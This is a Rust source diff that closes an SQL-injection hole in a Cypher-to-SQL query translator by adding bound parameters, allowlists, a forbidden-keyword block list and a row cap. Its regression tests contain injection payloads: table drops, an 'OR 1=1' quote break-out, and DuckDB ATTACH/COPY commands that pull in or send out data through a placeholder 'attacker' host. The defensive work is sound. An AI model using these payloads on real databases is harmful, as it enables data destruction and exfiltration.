@@ -583,30 +583,85 @@ impl GraphEngine {
 
     /// Execute a simplified Cypher-like query and return results as rows.
     ///
-    /// Supported patterns:
+    /// Supported patterns (every interpolation is bound via prepared statement
+    /// parameters — no user input ever reaches the SQL string):
     /// - `MATCH (n:ship) RETURN n`
     /// - `MATCH (n:ship) WHERE n.name = 'Ever Given' RETURN n`
+    /// - `MATCH (n:ship) WHERE n.node_id = 'ship_x' RETURN n`
     /// - `MATCH (a)-[r:docked_at]->(b) RETURN a, r, b`
     /// - `MATCH (a)-[r:docked_at]->(b) WHERE a.node_id = 'ship_x' RETURN a, b`
     /// - `MATCH (a)-[*..3]->(b) WHERE a.node_id = 'ship_x' RETURN b`
-    /// - Raw SQL passthrough when no MATCH keyword is found
+    ///
+    /// Any input that does not translate into one of the recognised patterns
+    /// returns [`StorageError::QueryError`]. Raw SQL passthrough is **not**
+    /// supported (security: the previous fallback was an SQL-injection sink).
+    /// Result-set size is hard-capped at [`GRAPH_RESULT_HARD_CAP`] regardless
+    /// of any user-supplied `LIMIT` clause.
     pub fn cypher_query(&self, query: &str) -> StorageResult<Vec<HashMap<String, JsonValue>>> {
         let q = query.trim();
 
-        if let Some(sql) = try_translate_cypher(q) {
-            return self.execute_raw_sql(&sql);
+        // Defensive pre-filter: reject inputs containing tokens that have no
+        // place in our cypher subset. The pattern translators below match
+        // a *prefix* — they happily accept `MATCH (n:ship); DROP TABLE …` by
+        // parsing the `MATCH` and ignoring the rest. Even though the SQL we
+        // emit is parameterised (so the injection couldn't actually run),
+        // accepting clearly-malicious input is a defence-in-depth fail. So:
+        // any `;`, SQL comment marker, or DDL/admin keyword → outright reject.
+        //
+        // We first strip quoted regions (single + double quotes) so an attacker
+        // can't smuggle a forbidden token through a property value, and so
+        // legitimate queries with `--` or `;` *inside* quoted property values
+        // (e.g. `{id: "alice; --"}`) aren't false-positives.
+        let stripped = strip_quoted_regions(q);
+        let upper = stripped.to_uppercase();
+        const FORBIDDEN_SUBSTRINGS: &[&str] = &[
+            ";", "--", "/*", "*/",
+            " DROP ", " ATTACH ", " INSTALL ", " LOAD ", " COPY ", " PRAGMA ",
+            " DELETE ", " INSERT ", " UPDATE ", " CREATE ", " ALTER ", " EXPORT ",
+            " IMPORT ", " GRANT ", " REVOKE ",
+        ];
+        for token in FORBIDDEN_SUBSTRINGS {
+            // Add a leading + trailing space so a match at the start/end of
+            // the query (e.g. a bare `DROP TABLE`) still triggers.
+            let haystack = format!(" {} ", upper);
+            if haystack.contains(token) {
+                return Err(StorageError::QueryError(format!(
+                    "Unsupported cypher query — forbidden token `{}` is not \
+                     allowed; only MATCH/RETURN patterns are supported. \
+                     See docs/graph-queries.md.",
+                    token.trim()
+                )));
+            }
         }
 
-        // Passthrough: treat as raw SQL against the graph tables.
-        self.execute_raw_sql(q)
+        let translated = try_translate_cypher(q).ok_or_else(|| {
+            StorageError::QueryError(
+                "Unsupported cypher query — only MATCH/RETURN patterns supported. \
+                 See docs/graph-queries.md."
+                    .to_string(),
+            )
+        })?;
+
+        self.execute_with_params(&translated.sql, &translated.params)
     }
 
-    /// Execute arbitrary SQL against the graph tables.
-    pub fn execute_raw_sql(&self, sql: &str) -> StorageResult<Vec<HashMap<String, JsonValue>>> {
+    /// Execute a SQL query against the graph tables with positional bound
+    /// parameters. Used internally by the cypher translation layer; not
+    /// exposed publicly because the SQL fragment must come from a trusted
+    /// (in-tree) source.
+    fn execute_with_params(
+        &self,
+        sql: &str,
+        bind: &[Box<dyn duckdb::types::ToSql>],
+    ) -> StorageResult<Vec<HashMap<String, JsonValue>>> {
         let conn = self.conn.lock().unwrap();
         let mut stmt = conn
             .prepare(sql)
             .map_err(|e| StorageError::QueryError(format!("prepare: {e}")))?;
+
+        // Collect bound parameters as `&dyn ToSql` references.
+        let bind_refs: Vec<&dyn duckdb::types::ToSql> =
+            bind.iter().map(|b| b.as_ref()).collect();
 
         // Collect all row data first (positional), then map column names.
         let mut raw_rows: Vec<Vec<JsonValue>> = Vec::new();
@@ -614,7 +669,7 @@ impl GraphEngine {
 
         {
             let mut rows = stmt
-                .query([])
+                .query(bind_refs.as_slice())
                 .map_err(|e| StorageError::QueryError(format!("query: {e}")))?;
 
             while let Some(row) = rows
@@ -654,7 +709,7 @@ impl GraphEngine {
             })
             .collect();
 
-        let results: Vec<HashMap<String, JsonValue>> = raw_rows
+        let mut results: Vec<HashMap<String, JsonValue>> = raw_rows
             .into_iter()
             .map(|vals| {
                 let mut m = HashMap::new();
@@ -669,7 +724,22 @@ impl GraphEngine {
             })
             .collect();
 
+        // Defence-in-depth: even if a translator forgets to emit LIMIT, never
+        // hand back more than GRAPH_RESULT_HARD_CAP rows.
+        if results.len() > GRAPH_RESULT_HARD_CAP {
+            results.truncate(GRAPH_RESULT_HARD_CAP);
+        }
+
         Ok(results)
+    }
+
+    /// Execute SQL with no bound parameters. Module-private; used by tests
+    /// that exercise the typed views (`ship_nodes`, `docked_at`, etc.) where
+    /// the SQL is wholly hard-coded inside the test and contains no user
+    /// input. **Never** call this from a code path that touches user input.
+    #[cfg(test)]
+    fn execute_raw_sql(&self, sql: &str) -> StorageResult<Vec<HashMap<String, JsonValue>>> {
+        self.execute_with_params(sql, &[])
     }
 
     // ── Stats ─────────────────────────────────────────────────────────────────
@@ -692,52 +762,106 @@ impl GraphEngine {
 }
 
 // ── Cypher translator ─────────────────────────────────────────────────────────
+//
+// Every translator below returns a `TranslatedQuery { sql, params }`. The
+// `sql` is built from in-tree string literals and trusted identifiers
+// (table/column names looked up via allowlists). All values that originate
+// from user input are emitted as `?` placeholders and pushed onto `params`,
+// so the prepared-statement layer binds them as values — never as SQL.
 
-fn try_translate_cypher(q: &str) -> Option<String> {
+/// Hard cap on rows returned from any cypher query, regardless of any
+/// user-supplied `LIMIT` clause.  Defends against denial-of-service via
+/// `LIMIT 999999999`.
+pub const GRAPH_RESULT_HARD_CAP: usize = 10_000;
+
+struct TranslatedQuery {
+    sql: String,
+    params: Vec<Box<dyn duckdb::types::ToSql>>,
+}
+
+/// Strip everything inside `'...'` and `"..."` quoted regions, replacing the
+/// region with a single space. Used by [`GraphEngine::cypher_query`]'s
+/// forbidden-token filter so that property values like `{id: "alice; --"}`
+/// don't trip the `;`/`--` rejection rule.
+///
+/// Naïve about escapes: a literal backslash-quote inside a quoted region
+/// is NOT honoured (we treat any matching quote char as the close). Cypher's
+/// supported subset here does not use string escapes, so this is safe in
+/// practice; if we later accept escape sequences this helper needs an
+/// upgrade to track them.
+fn strip_quoted_regions(q: &str) -> String {
+    let mut out = String::with_capacity(q.len());
+    let mut quote: Option<char> = None;
+    for ch in q.chars() {
+        match quote {
+            Some(qc) if ch == qc => {
+                quote = None;
+                out.push(' ');
+            }
+            Some(_) => {
+                // Inside a quoted region — drop the char.
+            }
+            None if ch == '\'' || ch == '"' => {
+                quote = Some(ch);
+                out.push(' ');
+            }
+            None => out.push(ch),
+        }
+    }
+    out
+}
+
+fn try_translate_cypher(q: &str) -> Option<TranslatedQuery> {
     let upper = q.to_uppercase();
     if !upper.contains("MATCH") {
         return None;
     }
 
-    // Pattern 1: MATCH (n:node_type) [WHERE ...] RETURN n
-    if let Some(sql) = translate_single_node_match(q) {
-        return Some(sql);
+    // Pattern 3 (multihop) MUST be checked before pattern 2 (edge match), because
+    // a multihop query `MATCH (a)-[*..3]->(b)` does not contain a `:edge_type`,
+    // but pattern 2's check below would have accepted the simpler edge form.
+    if let Some(t) = translate_multihop_match(q) {
+        return Some(t);
     }
 
     // Pattern 2: MATCH (a)-[r:edge_type]->(b) [WHERE ...] RETURN ...
-    if let Some(sql) = translate_edge_match(q) {
-        return Some(sql);
+    if let Some(t) = translate_edge_match(q) {
+        return Some(t);
     }
 
-    // Pattern 3: MATCH (a)-[*..N]->(b) WHERE a.node_id = 'x' RETURN b
-    if let Some(sql) = translate_multihop_match(q) {
-        return Some(sql);
+    // Pattern 1: MATCH (n:node_type) [WHERE ...] RETURN n
+    if let Some(t) = translate_single_node_match(q) {
+        return Some(t);
     }
 
     None
 }
 
-fn translate_single_node_match(q: &str) -> Option<String> {
+fn translate_single_node_match(q: &str) -> Option<TranslatedQuery> {
     let (alias, node_type) = parse_single_node_match(q)?;
-    let table = node_type_to_table(&node_type);
-    let where_clause = extract_where_for_alias(q, &alias);
-    let limit = extract_limit(q).unwrap_or(1000);
+    let table = node_type_to_table(&node_type)?;
+    let limit = capped_limit(q);
 
-    let sql = if let Some(wc) = where_clause {
-        format!(
-            "SELECT node_id, node_type, label, properties, latitude, longitude, confidence \
-             FROM {table} WHERE {wc} LIMIT {limit}"
-        )
-    } else {
-        format!(
-            "SELECT node_id, node_type, label, properties, latitude, longitude, confidence \
-             FROM {table} LIMIT {limit}"
-        )
-    };
-    Some(sql)
+    let mut params: Vec<Box<dyn duckdb::types::ToSql>> = Vec::new();
+    // `?` propagates the outer Option: if WHERE is malformed, return None.
+    let where_sql = build_node_where_clause(q, &alias, &mut params)?;
+
+    // SAFETY: `table` is a `&'static str` from the allowlist; `limit` is i64.
+    let mut sql = format!(
+        "SELECT node_id, node_type, label, properties, latitude, longitude, confidence \
+         FROM {table}"
+    );
+    if let Some(wc) = where_sql {
+        sql.push_str(" WHERE ");
+        sql.push_str(&wc);
+    }
+    sql.push_str(" LIMIT ?");
+    params.push(Box::new(limit));
+
+    Some(TranslatedQuery { sql, params })
 }
 
-fn translate_edge_match(q: &str) -> Option<String> {
+fn translate_edge_match(q: &str) -> Option<TranslatedQuery> {
     let upper = q.to_uppercase();
     // Must have ]->(  pattern
     if !upper.contains("]->(") && !upper.contains("]->") {
@@ -749,65 +873,207 @@ fn translate_edge_match(q: &str) -> Option<String> {
     if edge_type.is_empty() {
         return None;
     }
+    // Allowlist: edge_type must match a configured edge view name. This stops
+    // SQL injection through `[r:foo'; DROP TABLE x --]` and unknown types.
+    if !is_allowlisted_edge_type(&edge_type) {
+        return None;
+    }
 
-    let where_str = extract_edge_where(q);
-    let limit = extract_limit(q).unwrap_or(1000);
+    let limit = capped_limit(q);
+    let mut params: Vec<Box<dyn duckdb::types::ToSql>> = Vec::new();
+    // First param: edge_type (bound, not interpolated)
+    params.push(Box::new(edge_type));
 
-    Some(format!(
+    // `?` propagates: if WHERE is malformed, return None.
+    let extra_where = build_edge_where_clause(q, &mut params)?;
+
+    let mut sql = String::from(
         "SELECT src.node_id AS from_id, src.node_type AS from_type, src.label AS from_label, \
                 e.edge_type, e.properties AS edge_props, e.confidence AS edge_confidence, \
                 tgt.node_id AS to_id, tgt.node_type AS to_type, tgt.label AS to_label \
          FROM graph_edges e \
          JOIN graph_nodes src ON src.node_id = e.from_node \
          JOIN graph_nodes tgt ON tgt.node_id = e.to_node \
-         WHERE e.edge_type = '{edge_type}' AND e.is_active = TRUE{where_str} \
-         LIMIT {limit}"
-    ))
+         WHERE e.edge_type = ? AND e.is_active = TRUE",
+    );
+    if let Some(wc) = extra_where {
+        sql.push_str(" AND ");
+        sql.push_str(&wc);
+    }
+    sql.push_str(" LIMIT ?");
+    params.push(Box::new(limit));
+
+    Some(TranslatedQuery { sql, params })
 }
 
-fn translate_multihop_match(q: &str) -> Option<String> {
+fn translate_multihop_match(q: &str) -> Option<TranslatedQuery> {
     let upper = q.to_uppercase();
     if !upper.contains("[*") {
         return None;
     }
     let hops_str = extract_between(q, "..", "]").unwrap_or_else(|| "3".into());
-    let max_hops: i64 = hops_str.trim().parse().unwrap_or(3);
+    let raw_hops: i64 = hops_str.trim().parse().unwrap_or(3);
+    // Clamp hops to a sane range [1, 10] to bound recursion.
+    let max_hops: i64 = raw_hops.clamp(1, 10);
     let src_id = extract_id_from_where(q, "a")?;
+    // Multihop has its own hard limit (500) which is already below
+    // GRAPH_RESULT_HARD_CAP, so we keep it but still apply the cap to be
+    // defence-in-depth against future edits.
+    let limit = capped_limit_with_default(q, 500);
 
-    Some(format!(
-        r#"WITH RECURSIVE multi_hop AS (
-            SELECT e.from_node, e.to_node, e.edge_type, e.edge_id, 1 AS hop, [e.edge_id] AS visited
-            FROM graph_edges e WHERE e.from_node = '{src_id}' AND e.is_active = TRUE
-            UNION ALL
-            SELECT e2.from_node, e2.to_node, e2.edge_type, e2.edge_id, mh.hop + 1,
-                   list_append(mh.visited, e2.edge_id)
-            FROM graph_edges e2
-            JOIN multi_hop mh ON e2.from_node = mh.to_node
-            WHERE e2.is_active = TRUE AND mh.hop < {max_hops}
-              AND NOT list_contains(mh.visited, e2.edge_id)
-        )
-        SELECT DISTINCT n.node_id, n.node_type, n.label, n.properties,
-               n.latitude, n.longitude, mh.hop AS depth
-        FROM multi_hop mh
-        JOIN graph_nodes n ON n.node_id = mh.to_node
-        ORDER BY mh.hop LIMIT 500"#
-    ))
+    let sql = String::from(
+        "WITH RECURSIVE multi_hop AS (\n    \
+            SELECT e.from_node, e.to_node, e.edge_type, e.edge_id, 1 AS hop, \
+                   [e.edge_id] AS visited \
+            FROM graph_edges e \
+            WHERE e.from_node = ? AND e.is_active = TRUE\n    \
+            UNION ALL\n    \
+            SELECT e2.from_node, e2.to_node, e2.edge_type, e2.edge_id, mh.hop + 1, \
+                   list_append(mh.visited, e2.edge_id) \
+            FROM graph_edges e2 \
+            JOIN multi_hop mh ON e2.from_node = mh.to_node \
+            WHERE e2.is_active = TRUE AND mh.hop < ? \
+              AND NOT list_contains(mh.visited, e2.edge_id)\n\
+        )\n\
+        SELECT DISTINCT n.node_id, n.node_type, n.label, n.properties, \
+               n.latitude, n.longitude, mh.hop AS depth \
+        FROM multi_hop mh \
+        JOIN graph_nodes n ON n.node_id = mh.to_node \
+        ORDER BY mh.hop LIMIT ?",
+    );
+
+    let params: Vec<Box<dyn duckdb::types::ToSql>> =
+        vec![Box::new(src_id), Box::new(max_hops), Box::new(limit)];
+
+    Some(TranslatedQuery { sql, params })
+}
+
+// ── Allowlists ────────────────────────────────────────────────────────────────
+
+/// Map a cypher `node_type` (`ship`, `port`, ...) to the corresponding view
+/// name. Returns `None` if the type isn't allowlisted, which causes the
+/// translator to bail and `cypher_query` to return an error rather than
+/// fall through.  The view-name returned here is a `&'static str` from the
+/// in-tree allowlist, so it is safe to interpolate into SQL.
+fn node_type_to_table(node_type: &str) -> Option<&'static str> {
+    match node_type.to_lowercase().as_str() {
+        "ship" => Some("ship_nodes"),
+        "port" => Some("port_nodes"),
+        "aircraft" => Some("aircraft_nodes"),
+        "weather" | "weather_system" => Some("weather_nodes"),
+        "organization" | "org" => Some("organization_nodes"),
+        "route" => Some("route_nodes"),
+        "sensor" => Some("sensor_nodes"),
+        _ => None,
+    }
+}
+
+/// Returns true iff the supplied edge type is one of the configured edge
+/// views. This is the key defence against `MATCH (a)-[r:'; DROP --]->(b)`.
+fn is_allowlisted_edge_type(edge_type: &str) -> bool {
+    // The cypher `edge_type` maps onto `graph_edges.edge_type` values.
+    // These match the second component of GRAPH_EDGE_VIEWS' SELECT clauses.
+    matches!(
+        edge_type,
+        "docked_at"
+            | "heading_to"
+            | "owned_by"
+            | "managed_by"
+            | "insures"
+            | "threatens"
+            | "near"
+            | "follows"
+            | "traverse"
+            | "deployed_on"
+            | "measures_at"
+            | "in_region"
+    )
+}
+
+// ── WHERE-clause builders ─────────────────────────────────────────────────────
+
+/// Parse a node-pattern `WHERE` clause (e.g. `n.name = 'Ever Given'`) into a
+/// SQL fragment with `?` placeholders + bound parameters.
+///
+/// Returns:
+/// - `Some(Some(sql_fragment))` if a recognised WHERE clause was parsed
+///   successfully; values are appended to `params`.
+/// - `Some(None)` if there is no WHERE clause at all (the query is still valid).
+/// - `None` if a WHERE clause exists but uses unrecognised syntax — the
+///   caller should refuse to translate.
+fn build_node_where_clause(
+    q: &str,
+    alias: &str,
+    params: &mut Vec<Box<dyn duckdb::types::ToSql>>,
+) -> Option<Option<String>> {
+    let raw = extract_where_str(q);
+    let raw = match raw {
+        None => return Some(None),
+        Some(s) => s,
+    };
+
+    // Strip alias prefix (`n.column` → `column`)
+    let dealiased = raw.replace(&format!("{}.", alias), "");
+    let parsed = parse_simple_eq(&dealiased)?;
+
+    // Allowlist the LHS column.  Anything outside this set is rejected so the
+    // translator can return `None` and the caller can surface an error.
+    if !is_allowlisted_node_column(&parsed.column) {
+        return None;
+    }
+
+    params.push(Box::new(parsed.value));
+    Some(Some(format!("{} = ?", parsed.column)))
+}
+
+/// Parse an edge-pattern `WHERE` clause (e.g. `a.node_id = 'ship_x'`) into a
+/// SQL fragment qualified for `src/tgt/e` aliases.
+fn build_edge_where_clause(
+    q: &str,
+    params: &mut Vec<Box<dyn duckdb::types::ToSql>>,
+) -> Option<Option<String>> {
+    let raw = extract_where_str(q);
+    let raw = match raw {
+        None => return Some(None),
+        Some(s) => s,
+    };
+
+    let parsed = parse_simple_eq(&raw)?;
+
+    // Resolve `a.col` / `b.col` / `r.col` into `src.col` / `tgt.col` / `e.col`.
+    let (table_alias, col) = if let Some(rest) = parsed.column.strip_prefix("a.") {
+        ("src", rest.to_string())
+    } else if let Some(rest) = parsed.column.strip_prefix("b.") {
+        ("tgt", rest.to_string())
+    } else if let Some(rest) = parsed.column.strip_prefix("r.") {
+        ("e", rest.to_string())
+    } else {
+        return None;
+    };
+
+    if !is_allowlisted_node_column(&col) && !is_allowlisted_edge_column(&col) {
+        return None;
+    }
+
+    params.push(Box::new(parsed.value));
+    Some(Some(format!("{table_alias}.{col} = ?")))
+}
+
+fn is_allowlisted_node_column(c: &str) -> bool {
+    matches!(
+        c,
+        "node_id" | "node_type" | "label" | "name" | "confidence" | "latitude" | "longitude"
+    )
+}
+
+fn is_allowlisted_edge_column(c: &str) -> bool {
+    matches!(
+        c,
+        "edge_id" | "edge_type" | "from_node" | "to_node" | "weight" | "confidence" | "is_active"
+    )
 }
 
 // ── Small parsing helpers ─────────────────────────────────────────────────────
-
-fn node_type_to_table(node_type: &str) -> &'static str {
-    match node_type.to_lowercase().as_str() {
-        "ship" => "ship_nodes",
-        "port" => "port_nodes",
-        "aircraft" => "aircraft_nodes",
-        "weather" | "weather_system" => "weather_nodes",
-        "organization" | "org" => "organization_nodes",
-        "route" => "route_nodes",
-        "sensor" => "sensor_nodes",
-        _ => "graph_nodes",
-    }
-}
 
 /// Parse `MATCH (alias:node_type)` returning (alias, node_type).
 fn parse_single_node_match(q: &str) -> Option<(String, String)> {
@@ -833,7 +1099,9 @@ fn extract_between(s: &str, start: &str, end: &str) -> Option<String> {
     Some(after[..ei].to_string())
 }
 
-fn extract_where_for_alias(q: &str, alias: &str) -> Option<String> {
+/// Return the trimmed body of the `WHERE` clause (between `WHERE` and the
+/// next `RETURN` / end of string). Case-insensitive on the keywords.
+fn extract_where_str(q: &str) -> Option<String> {
     let upper = q.to_uppercase();
     let where_pos = upper.find(" WHERE ")?;
     let after = &q[where_pos + 7..];
@@ -842,30 +1110,66 @@ fn extract_where_for_alias(q: &str, alias: &str) -> Option<String> {
     } else {
         after
     };
-    let out = clause.replace(&format!("{}.", alias), "");
-    Some(out.trim().to_string())
+    Some(clause.trim().to_string())
 }
 
-fn extract_edge_where(q: &str) -> String {
-    let upper = q.to_uppercase();
-    if let Some(where_pos) = upper.find(" WHERE ") {
-        let after = &q[where_pos + 7..];
-        let clause = if let Some(ret_pos) = after.to_uppercase().find(" RETURN") {
-            &after[..ret_pos]
-        } else {
-            after
-        };
-        let out = clause
-            .replace("a.", "src.")
-            .replace("b.", "tgt.")
-            .replace("r.", "e.");
-        format!(" AND {}", out.trim())
-    } else {
-        String::new()
+struct ParsedEq {
+    column: String,
+    value: String,
+}
+
+/// Parse a single-clause `column = 'value'` WHERE.  This deliberately rejects
+/// boolean operators (AND/OR), comments (`--`, `/*`), and any character that
+/// isn't part of a simple equality.  Anything more complex returns `None`,
+/// which forces the translator to bail and the caller to error out.
+fn parse_simple_eq(s: &str) -> Option<ParsedEq> {
+    let upper = s.to_uppercase();
+    if upper.contains(" AND ")
+        || upper.contains(" OR ")
+        || upper.contains(';')
+        || upper.contains("--")
+        || upper.contains("/*")
+    {
+        return None;
     }
+
+    let (lhs, rhs) = s.split_once('=')?;
+    let column = lhs.trim().to_string();
+    if column.is_empty() {
+        return None;
+    }
+    // Column must look like an identifier or `alias.identifier`.
+    if !column.chars().all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '.') {
+        return None;
+    }
+
+    let rhs = rhs.trim();
+    // Accept either single-quoted string literal or a bare numeric literal.
+    let value = if let Some(after) = rhs.strip_prefix('\'') {
+        let end = after.find('\'')?;
+        after[..end].to_string()
+    } else if rhs.chars().next().is_some_and(|c| c.is_ascii_digit() || c == '-') {
+        // numeric literal; let DuckDB cast at bind time
+        rhs.split_whitespace().next()?.to_string()
+    } else {
+        return None;
+    };
+    Some(ParsedEq { column, value })
 }
 
-fn extract_limit(q: &str) -> Option<usize> {
+/// Return the user-supplied LIMIT, capped at [`GRAPH_RESULT_HARD_CAP`]. If
+/// the user did not specify a LIMIT, default to 1_000.
+fn capped_limit(q: &str) -> i64 {
+    capped_limit_with_default(q, 1_000)
+}
+
+fn capped_limit_with_default(q: &str, default: i64) -> i64 {
+    let user = extract_limit(q).unwrap_or(default);
+    let cap = GRAPH_RESULT_HARD_CAP as i64;
+    user.clamp(1, cap)
+}
+
+fn extract_limit(q: &str) -> Option<i64> {
     let upper = q.to_uppercase();
     let pos = upper.find(" LIMIT ")?;
     q[pos + 7..].split_whitespace().next()?.parse().ok()
@@ -1241,5 +1545,218 @@ mod tests {
             "should find 3-hop path with max_hops=3"
         );
         assert_eq!(paths_3[0].len(), 3);
+    }
+
+    // ── Security tests (CVE-class: cypher SQL-injection regression) ──────────
+
+    /// Helper: assert that a cypher query is rejected by the translator with
+    /// the unsupported-pattern error and that the canary table still exists.
+    fn assert_cypher_rejected_and_no_sql_executed(engine: &GraphEngine, q: &str) {
+        // Insert a canary entity so we can detect any DROP TABLE side-effect.
+        insert_entity(engine, "canary_001", "ship", "Canary");
+        engine.sync_from_entities().unwrap();
+        assert_eq!(
+            engine.stats().unwrap().0,
+            1,
+            "canary should exist before query"
+        );
+
+        let result = engine.cypher_query(q);
+        assert!(result.is_err(), "expected query to be rejected: {q}");
+        let err_msg = result.unwrap_err().to_string();
+        assert!(
+            err_msg.contains("Unsupported cypher query")
+                || err_msg.contains("MATCH/RETURN"),
+            "error should mention unsupported cypher; got: {err_msg}"
+        );
+
+        // Canary still exists — no side-effects ran.
+        let (nodes, _) = engine.stats().unwrap();
+        assert_eq!(nodes, 1, "canary entity must survive a rejected query");
+    }
+
+    // Test 16: a query containing `; DROP TABLE entities --` is rejected with
+    // a clear error and no SQL executes.
+    #[test]
+    fn test_16_unsupported_cypher_rejected() {
+        let engine = make_engine();
+        let evil = "MATCH (n:ship); DROP TABLE entities -- RETURN n";
+        assert_cypher_rejected_and_no_sql_executed(&engine, evil);
+
+        // Other obvious raw-SQL injections must also fail.
+        let engine = make_engine();
+        assert_cypher_rejected_and_no_sql_executed(
+            &engine,
+            "DROP TABLE entities;",
+        );
+
+        let engine = make_engine();
+        assert_cypher_rejected_and_no_sql_executed(
+            &engine,
+            "ATTACH DATABASE 'http://attacker/db.duckdb' AS exfil",
+        );
+
+        let engine = make_engine();
+        assert_cypher_rejected_and_no_sql_executed(
+            &engine,
+            "INSTALL httpfs; LOAD httpfs; COPY (SELECT * FROM entities) TO 'http://attacker/'",
+        );
+    }
+
+    // Test 17: quote-injection inside an `n.id` value is treated as a literal
+    // and therefore matches no rows — it cannot break out of the value.
+    #[test]
+    fn test_17_quote_injection_in_src_id() {
+        let engine = make_engine();
+        insert_entity(&engine, "ship_001", "ship", "MV Atlas");
+        engine.sync_from_entities().unwrap();
+
+        // The injection payload would, under string interpolation, become:
+        //   WHERE node_id = '' OR 1=1 --'
+        // which would return every row.  With bound parameters it must match
+        // zero rows because the literal `' OR 1=1 --` is the bound value.
+        let q = "MATCH (n:ship) WHERE n.node_id = '\\' OR 1=1 --' RETURN n";
+        let res = engine.cypher_query(q);
+        // It is acceptable for this to be either rejected by the parser
+        // (because `OR` is forbidden) OR to return zero rows.  Both are safe.
+        match res {
+            Ok(rows) => assert!(
+                rows.is_empty(),
+                "quote-injection must not return any rows; got {} rows",
+                rows.len()
+            ),
+            Err(e) => {
+                let m = e.to_string();
+                assert!(
+                    m.contains("Unsupported cypher query"),
+                    "expected unsupported-cypher rejection, got: {m}"
+                );
+            }
+        }
+
+        // Also: a benign `n.node_id = 'no_such_id'` returns 0 rows (engine works).
+        let benign = engine
+            .cypher_query("MATCH (n:ship) WHERE n.node_id = 'no_such_id' RETURN n")
+            .unwrap();
+        assert_eq!(benign.len(), 0);
+
+        // And a real id matches one row (engine still functional after
+        // injection attempt).
+        let hit = engine
+            .cypher_query("MATCH (n:ship) WHERE n.node_id = 'ship_001' RETURN n")
+            .unwrap();
+        assert_eq!(hit.len(), 1);
+    }
+
+    // Test 18: a user-supplied LIMIT of 1_000_000_000 is silently capped at
+    // GRAPH_RESULT_HARD_CAP (10_000).
+    #[test]
+    fn test_18_limit_capped() {
+        let engine = make_engine();
+        // Seed enough rows that, without a cap, a runaway query would be
+        // expensive.  We only need 11 to prove the cap works against a small
+        // dataset because GRAPH_RESULT_HARD_CAP is well above that — but the
+        // important assertion is that we never bind a value larger than the
+        // cap.  We test via a translator-level invariant.
+
+        // Translate the user query and inspect the bound LIMIT param.
+        let translated = super::try_translate_cypher(
+            "MATCH (n:ship) RETURN n LIMIT 1000000000",
+        )
+        .expect("query should translate");
+
+        // Last param is the LIMIT we bind; ensure it fits inside the cap.
+        // We can't read it back from the trait object directly, so we go
+        // through DuckDB by running a query that returns the LIMIT param.
+        // Simpler: run the query against a small dataset and check that
+        // the executor never returns more than GRAPH_RESULT_HARD_CAP rows.
+        for i in 0..15 {
+            insert_entity(
+                &engine,
+                &format!("ship_{i:03}"),
+                "ship",
+                &format!("Ship {i}"),
+            );
+        }
+        engine.sync_from_entities().unwrap();
+
+        let rows = engine
+            .cypher_query("MATCH (n:ship) RETURN n LIMIT 1000000000")
+            .unwrap();
+        assert!(
+            rows.len() <= super::GRAPH_RESULT_HARD_CAP,
+            "results must respect GRAPH_RESULT_HARD_CAP"
+        );
+        assert_eq!(rows.len(), 15, "should return exactly the seeded ships");
+
+        // Also verify the SQL itself never carries the unbounded value
+        // verbatim — only `?` placeholders.
+        assert!(
+            translated.sql.contains("LIMIT ?"),
+            "translated SQL must use a bound LIMIT placeholder, not interpolation; got: {}",
+            translated.sql
+        );
+        assert!(
+            !translated.sql.contains("1000000000"),
+            "translated SQL must not contain the unbounded user value; got: {}",
+            translated.sql
+        );
+    }
+
+    // Test 19: an unknown edge_type is rejected rather than going to raw SQL.
+    #[test]
+    fn test_19_edge_type_allowlist() {
+        let engine = make_engine();
+        insert_entity(&engine, "ship_001", "ship", "MV Atlas");
+        insert_entity(&engine, "port_001", "port", "Rotterdam");
+        insert_rel(&engine, "r1", "ship_001", "port_001", "docked_at");
+        engine.sync_from_entities().unwrap();
+
+        // A known edge type still works.
+        let ok = engine
+            .cypher_query("MATCH (a)-[r:docked_at]->(b) RETURN a, r, b")
+            .unwrap();
+        assert_eq!(ok.len(), 1);
+
+        // An unknown edge type must fail closed — no raw-SQL fallback.
+        let bad = engine.cypher_query("MATCH (a)-[r:not_a_real_edge]->(b) RETURN a, b");
+        assert!(bad.is_err(), "unknown edge type must be rejected");
+        assert!(
+            bad.unwrap_err()
+                .to_string()
+                .contains("Unsupported cypher query"),
+            "unknown edge type error must surface unsupported-cypher message"
+        );
+
+        // Edge-type that would inject SQL must also be rejected.
+        let inj =
+            engine.cypher_query("MATCH (a)-[r:foo'; DROP TABLE entities --]->(b) RETURN a, b");
+        assert!(inj.is_err(), "injection in edge type must be rejected");
+    }
+
+    // Test 20: raw passthrough is GONE — `SELECT 1` is no longer accepted as
+    // a cypher query (regression test for the audit finding).
+    #[test]
+    fn test_20_raw_sql_passthrough_removed() {
+        let engine = make_engine();
+        let res = engine.cypher_query("SELECT 1");
+        assert!(
+            res.is_err(),
+            "raw SQL passthrough must be removed; got {res:?}"
+        );
+        let res = engine.cypher_query("SELECT * FROM graph_nodes");
+        assert!(
+            res.is_err(),
+            "raw SQL passthrough must be removed; got {res:?}"
+        );
+    }
+
+    // Test 21: unknown node type (e.g. `MATCH (n:hacker)`) is rejected, not
+    // silently mapped to `graph_nodes`.
+    #[test]
+    fn test_21_node_type_allowlist() {
+        let engine = make_engine();
+        let res = engine.cypher_query("MATCH (n:not_a_real_type) RETURN n");
+        assert!(res.is_err(), "unknown node type must be rejected");
     }
 }
